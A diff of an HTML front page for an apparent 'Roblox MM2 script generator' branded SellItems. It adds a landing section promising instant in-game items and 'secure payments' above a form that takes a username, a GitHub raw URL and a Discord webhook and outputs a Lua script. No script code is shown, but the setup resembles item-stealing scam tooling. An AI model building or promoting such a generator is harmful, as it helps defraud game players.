@@ -13,27 +13,57 @@
     </header>
 
     <main>
-      <form id="scriptForm">
-        <input type="text" id="username" placeholder="Roblox Username" required />
-        <input type="url" id="github" placeholder="GitHub Raw URL" required />
-        <input type="url" id="webhook" placeholder="Discord Webhook URL" required />
-        <button type="submit">✨ Generate Script</button>
-      </form>
+  <!-- 🔵 HOME PAGE SECTION -->
+  <section id="homeSection" class="home-section">
+    <h1 class="hero-title">Generate Your Script Instantly!</h1>
+    <p class="hero-subtitle">Quickly create a Roblox MM2 script with ease using our generator.</p>
+    <button onclick="goToGenerator()" class="hero-btn">✨ Generate</button>
 
-      <section id="output" class="output-card hidden">
-        <h2>✅ Your Lua Script</h2>
-        <pre id="scriptBox"></pre>
-        <div class="actions">
-          <button id="copyBtn">📋 Copy</button>
-          <button id="downloadBtn">⬇ Download</button>
-        </div>
-      </section>
-    </main>
+    <div class="features">
+      <div class="feature-box">
+        <h3>⚡ Instantly Receive Items</h3>
+        <p>Our 24/7 bot delivers your in-game items immediately after generation.</p>
+      </div>
+      <div class="feature-box">
+        <h3>🔒 Secure Payments</h3>
+        <p>All payments are processed safely with token conversion and auto payout.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 🟣 GENERATOR SECTION -->
+  <section id="generatorSection" class="hidden generator-section">
+    <form id="scriptForm">
+      <input type="text" id="username" placeholder="Roblox Username" required />
+      <input type="url" id="github" placeholder="GitHub Raw URL" required />
+      <input type="url" id="webhook" placeholder="Discord Webhook URL" required />
+      <button type="submit">✨ Generate Script</button>
+    </form>
+
+    <section id="output" class="output-card hidden">
+      <h2>✅ Your Lua Script</h2>
+      <pre id="scriptBox"></pre>
+      <div class="actions">
+        <button id="copyBtn">📋 Copy</button>
+        <button id="downloadBtn">⬇ Download</button>
+      </div>
+    </section>
+
+    <button class="back-btn" onclick="goToHome()">← Back</button>
+  </section>
+</main>
 
     <footer>
-      <p>Made with ❤️ for the Roblox community</p>
-    </footer>
+  <div class="footer-container">
+    <div class="footer-left">
+      <p>© SellItems 2024, All Rights Reserved.</p>
+    </div>
+    <div class="footer-right">
+      <a href="#">Terms & Conditions</a>
+      <a href="#">Privacy Policy</a>
+    </div>
   </div>
+</footer>
 
   <script src="script.js"></script>
 </body>
